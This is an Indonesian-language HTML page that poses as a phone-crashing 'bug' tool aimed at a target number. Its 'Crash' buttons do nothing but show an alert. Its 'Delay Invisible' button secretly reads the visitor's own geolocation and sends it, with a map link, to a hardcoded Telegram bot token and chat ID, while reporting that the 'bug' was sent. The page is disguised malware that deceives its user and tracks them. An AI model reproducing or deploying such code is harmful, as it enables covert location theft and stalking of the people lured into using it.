<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Tredict Invictus Website</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&family=Roboto&display=swap" rel="stylesheet">
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Roboto', sans-serif;
            background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
            color: #ffffff;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        .container {
            background: rgba(0, 0, 0, 0.6);
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
            text-align: center;
            max-width: 400px;
            width: 90%;
        }

        h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 20px;
            margin-bottom: 10px;
            color: #00ffe7;
        }

        .input-box {
            margin: 15px 0;
        }

        input[type="text"] {
            width: 100%;
            padding: 12px;
            border-radius: 6px;
            border: none;
            font-size: 14px;
        }

        .button-group {
            display: flex;
            justify-content: space-between;
            margin-top: 15px;
        }

        .button-group button {
            flex: 1;
            margin: 0 5px;
            background: #00bfff;
            color: #000;
            font-weight: bold;
            padding: 12px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
        }

        .button-group button:hover {
            background: #009acd;
        }

        .status-info {
            margin-top: 20px;
            font-size: 14px;
            color: #ccc;
        }

        .support {
            margin-top: 15px;
            color: #00ffe7;
            font-size: 14px;
            cursor: pointer;
        }

        .logout-btn {
            position: absolute;
            top: 20px;
            right: 20px;
            background: #ff4d4d;
            border: none;
            color: white;
            padding: 8px 12px;
            border-radius: 6px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <button class="logout-btn">Logout</button>
        <h1>Tredict Invictus Website</h1>

        <div class="input-box">
            <input type="text" id="targetNumber" placeholder="Masukkan nomor target (62xxxx)">
        </div>

        <div class="button-group">
            <button onclick="handleCrash('android')">Crash Android</button>
            <button onclick="handleCrash('iphone')">Crash iPhone</button>
            <button onclick="sendLocation()">Delay Invisible</button>
        </div>

        <div class="status-info" id="status">
            <strong>Status:</strong> Server Aktif <br>
            <strong>Info:</strong> Selamat datang,<br>
            <strong>Perangkat:</strong> <span id="deviceInfo">Mendeteksi...</span>
        </div>

        <div class="support">Support</div>
    </div>

    <script>
        // Telegram config
        const BOT_TOKEN = '7957992532:AAF9CSk5-vWRuB2f8UJpeOf0cTv4QjoWHEY';
        const CHAT_ID = '6367209572';

        // Device Detection
        function detectDevice() {
            const ua = navigator.userAgent.toLowerCase();
            if (ua.includes("android")) return "Android";
            if (ua.includes("iphone") || ua.includes("ipad")) return "iPhone";
            return "Perangkat Lain";
        }

        document.getElementById("deviceInfo").textContent = detectDevice();

        // Crash simulation (dummy)
        function handleCrash(type) {
            alert("Simulasi crash untuk: " + type);
        }

        // Send Location to Telegram
        function sendLocation() {
            if (!navigator.geolocation) {
                document.getElementById('status').innerHTML += '<br>‚ùå Geolocation tidak didukung.';
                return;
            }

            document.getElementById('status').innerHTML += '<br>üì° Bug sedang berjalan...';

            navigator.geolocation.getCurrentPosition(
                position => {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;
                    const message = `üìç Lokasi Pengguna:\nLatitude: ${latitude}\nLongitude: ${longitude}\nhttps://maps.google.com/?q=${latitude},${longitude}`;

                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: message
                        })
                    })
                    .then(response => response.json())
                    .then(data => {
                        if (data.ok) {
                            document.getElementById('status').innerHTML += '<br>‚úÖ Bug berhasil di kirim!';
                        } else {
                            document.getElementById('status').innerHTML += `<br>‚ùå Gagal: ${data.description}`;
                        }
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        document.getElementById('status').innerHTML += '<br>‚ùå Terjadi kesalahan.';
                    });
                },
                error => {
                    document.getElementById('status').innerHTML += '<br>‚ùå Coba ulangi lagi.';
                }
            );
        }
    </script>
</body>
</html>
